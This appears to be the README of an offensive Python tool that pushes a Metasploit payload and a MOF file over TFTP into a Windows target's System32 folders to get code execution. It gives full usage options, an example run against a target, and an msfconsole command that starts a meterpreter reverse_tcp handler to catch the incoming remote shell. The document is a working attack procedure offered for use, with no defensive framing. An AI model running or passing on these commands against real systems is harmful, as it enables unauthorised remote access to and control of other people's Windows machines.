# python_tftp_mof_dropper

Transfers a MOF file and a payload via tftp to the target. Uses metasploit to generate the payload and the [tftpy](https://github.com/msoulier/tftpy) tftp library.

Usage:
```
python tftp_mof_dropper.py --help
usage: tftp_mof_dropper.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST
                           [--lport LPORT] [--exe_rfile EXE_RFILE]
                           [--mof_rfile MOF_RFILE] [--msf_payload MSF_PAYLOAD]

optional arguments:
  -h, --help            show this help message and exit
  --rhost RHOST         the remote host (default: None)
  --rport RPORT         the remote tftp port (default: 69)
  --lhost LHOST         the local host (default: None)
  --lport LPORT         the local port to listen on for incoming reverse shell
                        (default: 4444)
  --exe_rfile EXE_RFILE
                        the path on the remote host where the exe file (msf
                        payload) should be uploaded to (default:
                        /Windows/System32/)
  --mof_rfile MOF_RFILE
                        the path on the remote host where the mof file should
                        be uploaded to (default: /Windows/System32/wbem/mof/)
  --msf_payload MSF_PAYLOAD
                        the msf payload to use (default:
                        windows/meterpreter/reverse_tcp)
```

Example:
`python tftp_mof_dropper.py --rhost 1.2.3.4 --lhost 5.6.7.8`

Note: you must run a metasploit handler or netcat listener (depending on the payload you use) which captures the incoming reverse shell before executing the script. Create it with e.g. `msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 5.6.7.8; run' -q`
